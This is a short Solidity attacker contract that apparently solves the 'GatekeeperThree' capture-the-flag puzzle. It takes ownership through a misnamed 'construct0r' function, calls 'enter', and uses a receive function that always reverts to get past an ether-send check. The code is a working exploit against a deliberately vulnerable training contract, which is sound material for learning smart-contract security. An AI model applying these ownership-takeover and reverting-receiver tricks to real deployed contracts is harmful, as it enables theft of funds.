// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {GatekeeperThree} from "@puzzles/28/GatekeeperThree.sol";

contract GatekeeperThreeAttacker {
    GatekeeperThree public gatekeeperThree;

    constructor(address target) {
        gatekeeperThree = GatekeeperThree(payable(target));
    }

    receive() external payable {
        revert();
    }

    function attack() external {
        gatekeeperThree.construct0r();
        gatekeeperThree.enter();
    }
}
